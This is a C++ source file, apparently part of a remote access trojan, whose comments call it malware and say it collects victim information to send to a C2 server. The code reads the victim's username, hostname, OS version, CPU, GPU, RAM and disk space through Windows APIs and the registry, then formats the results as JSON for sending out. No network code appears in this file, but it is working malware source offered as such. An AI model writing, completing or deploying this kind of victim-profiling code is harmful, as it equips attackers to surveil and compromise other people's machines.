#include "SystemInfo.h"

typedef struct _RTL_OSVERSIONINFOEXW {
	DWORD dwOSVersionInfoSize;
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WCHAR szCSDVersion[128];
	WORD wServicePackMajor;
	WORD wServicePackMinor;
	WORD wSuiteMask;
	BYTE wProductType;
	BYTE wReserved;
} hlpRTL_OSVERSIONINFOEXW, * hlpPRTL_OSVERSIONINFOEXW;

typedef LONG(NTAPI* RtlGetVersionPtr)(hlpPRTL_OSVERSIONINFOEXW);



SystemInfo::SystemInfo() {

}

SystemInfo::~SystemInfo() {

}

void SystemInfo::GetUsername(WCHAR* username) {
	DWORD size = MAX_PATH;
	GetUserNameW(username, &size);
}

void SystemInfo::GetHostname(WCHAR* hostname) {
	DWORD size = MAX_PATH;
	GetComputerNameW(hostname, &size);
}

void SystemInfo::GetOS(WCHAR* os) {
	hlpRTL_OSVERSIONINFOEXW osInfo = { 0 };
	osInfo.dwOSVersionInfoSize = sizeof(hlpRTL_OSVERSIONINFOEXW);

	RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (!RtlGetVersion) {
		wcscpy_s(os, 256, L"Unknown");
		return;
	}

	if (RtlGetVersion(&osInfo) != 0) {
		wcscpy_s(os, MAX_PATH, L"Unknown");
		return;
	}

	WCHAR temp[MAX_PATH] = L"Windows ";
	WCHAR version[32];

	// create version string: major.minor.build
	wsprintf(version, L"%d.%d (Build %d)", osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber);
	wcscat_s(temp, version);

	// get product type (workstation or server) --> can handle it in server (change later)
	if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0) {
		if (osInfo.wProductType == VER_NT_WORKSTATION) {
			// win 10 or 11 (based on build number)
			if (osInfo.dwBuildNumber >= 22000) {
				wcscpy_s(temp, L"Windows 11 ");
			}
			else {
				wcscpy_s(temp, L"Windows 10 ");
			}
			wcscat_s(temp, version);
		}
		else {
			wcscat_s(temp, L"Server 2016/2019");
		}
	}
	else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {
		if (osInfo.wProductType == VER_NT_WORKSTATION) {
			wcscat_s(temp, L"8.1");
		}
		else {
			wcscat_s(temp, L" Server 2012 R2");
		}
	}
	else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {
		if (osInfo.wProductType == VER_NT_WORKSTATION) {
			wcscat_s(temp, L"8");
		}
		else {
			wcscat_s(temp, L" Server 2012");
		}
	}
	else {
		wcscat_s(temp, L" Unknown Version");
	}

	// add service pack 
	if (osInfo.wServicePackMajor > 0) {
		WCHAR sp[32];
		wsprintfW(sp, L" SP%d", osInfo.wServicePackMajor);
		wcscat_s(temp, sp);
	}
	wcscpy_s(os, MAX_PATH, temp);
}

void SystemInfo::GetCPU(WCHAR* cpu) {
	HKEY hKey;
	LONG res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", 0, KEY_READ, &hKey);
	if (res != ERROR_SUCCESS) {
		wcscpy_s(cpu, MAX_PATH, L"Unknown");
		return;
	}

	WCHAR cpuName[128];

	WCHAR temp[128];
	DWORD tempSize = sizeof(temp);
	res = RegQueryValueExW(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)temp, &tempSize);
	if (res != ERROR_SUCCESS) {
		wcscpy_s(cpuName, L"Unknown");
	}
	else {
		wcscpy_s(cpuName, temp);
	}

	DWORD speed = 0;
	DWORD speedSize = sizeof(speed);
	res = RegQueryValueExW(hKey, L"~MHz", NULL, NULL, (LPBYTE)&speed, &speedSize);
	if (res != ERROR_SUCCESS) {
		speed = 0;
	}
	RegCloseKey(hKey);

	DWORD cores = 0;
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	cores = (INT)sysInfo.dwNumberOfProcessors;

	// 
	WCHAR tempCpuInfo[MAX_PATH] = { 0 };
	wsprintfW(tempCpuInfo, L"%s, %d cores, %d MHz", cpuName, cores, speed);
	wcscpy_s(cpu, MAX_PATH, tempCpuInfo);
}

void SystemInfo::GetGPU(WCHAR* gpu) {
	DISPLAY_DEVICE dd;
	dd.cb = sizeof(dd);

	// just check the first device
	if (EnumDisplayDevicesW(NULL, 0, &dd, 0)) {
		if ((dd.StateFlags & DISPLAY_DEVICE_ATTACHED_TO_DESKTOP) && (dd.StateFlags & DISPLAY_DEVICE_ACTIVE)) {
			wcscpy_s(gpu, MAX_PATH, dd.DeviceString);
			return;
		}
	}
	wcscpy_s(gpu, MAX_PATH, L"Unknown");
}

void SystemInfo::GetRAM(WCHAR* ram) {
	MEMORYSTATUSEX memStatus;
	memStatus.dwLength = sizeof(memStatus);

	if (GlobalMemoryStatusEx(&memStatus)) {
		ULONGLONG totalRamBytes = memStatus.ullTotalPhys;
		ULONGLONG availRamBytes = memStatus.ullAvailPhys;
		double totalRamGB = totalRamBytes / (1024.0 * 1024 * 1024);
		double availRamGB = availRamBytes / (1024.0 * 1024 * 1024);
		swprintf(ram, MAX_PATH, L"Total RAM: %.2f GB, Available RAM: %.2f GB", totalRamGB, availRamGB);
	}
	else {
		wcscpy_s(ram, MAX_PATH, L"Unknown");
	}
}

// just get disk info where the malware is placed
void SystemInfo::GetDisk(WCHAR* disk) {
	WCHAR windowsDir[MAX_PATH];
	GetWindowsDirectoryW(windowsDir, MAX_PATH);
	WCHAR drive[4];
	drive[0] = windowsDir[0];
	drive[1] = L':';
	drive[2] = L'\\';
	drive[3] = L'\0';
	ULARGE_INTEGER totalBytes, freeBytes, availBytes;
	if (GetDiskFreeSpaceExW(drive, &freeBytes, &totalBytes, &availBytes)) {
		double totalDiskGB = totalBytes.QuadPart / (1024.0 * 1024 * 1024);
		double availDiskGB = availBytes.QuadPart / (1024.0 * 1024 * 1024);
		swprintf(disk, MAX_PATH, L"Total Disk: %.2f GB, Available Disk: %.2f GB", totalDiskGB, availDiskGB);
	}
	else {
		wcscpy_s(disk, MAX_PATH, L"Unknown");
	}
}

void SystemInfo::GetSystemDetails(SystemDetails* details) {
	//MessageBox(NULL, L"RAT collects the information of victim to send to server C2!", L"Flow", MB_OK);
	GetUsername(details->username);
	GetHostname(details->hostname);
	GetOS(details->os);
	GetCPU(details->cpu);
	GetGPU(details->gpu);
	GetRAM(details->ram);
	GetDisk(details->disk);
}

// convert SystemDetails to JSON
void JsonInfo(const SystemDetails* details, char* json, DWORD jsonSize) {
	if (!details || !json || jsonSize == 0) {
		if (json && jsonSize > 0) {
			json[0] = '\0';
		}
		return;
	}

	// convert WCHAR to char (utf8)
	char username[MAX_PATH], hostname[MAX_PATH], os[MAX_PATH], cpu[MAX_PATH], gpu[MAX_PATH], ram[MAX_PATH], disk[MAX_PATH];
	WStringToString(details->username, username, sizeof(username));
	WStringToString(details->hostname, hostname, sizeof(hostname));
	WStringToString(details->os, os, sizeof(os));
	WStringToString(details->cpu, cpu, sizeof(cpu));
	WStringToString(details->gpu, gpu, sizeof(gpu));
	WStringToString(details->ram, ram, sizeof(ram));
	WStringToString(details->disk, disk, sizeof(disk));

	char escapedUsername[MAX_PATH*2], escapedHostname[MAX_PATH*2], escapedOs[MAX_PATH*2], escapedCpu[MAX_PATH*2], escapedGpu[MAX_PATH*2], escapedRam[MAX_PATH*2], escapedDisk[MAX_PATH*2];

	EscapeJsonString(username, escapedUsername, sizeof(escapedUsername));
	EscapeJsonString(hostname, escapedHostname, sizeof(escapedHostname));
	EscapeJsonString(os, escapedOs, sizeof(escapedOs));
	EscapeJsonString(cpu, escapedCpu, sizeof(escapedCpu));
	EscapeJsonString(gpu, escapedGpu, sizeof(escapedGpu));
	EscapeJsonString(ram, escapedRam, sizeof(escapedRam));
	EscapeJsonString(disk, escapedDisk, sizeof(escapedDisk));
	// create JSON
	snprintf(json, jsonSize, "{\
\"username\": \"%s\", \
\"hostname\": \"%s\", \
\"os\": \"%s\", \
\"cpu\": \"%s\", \
\"gpu\": \"%s\", \
\"ram\": \"%s\", \
\"disk\": \"%s\" \
}", escapedUsername, escapedHostname, escapedOs, escapedCpu,
escapedGpu, escapedRam, escapedDisk);
}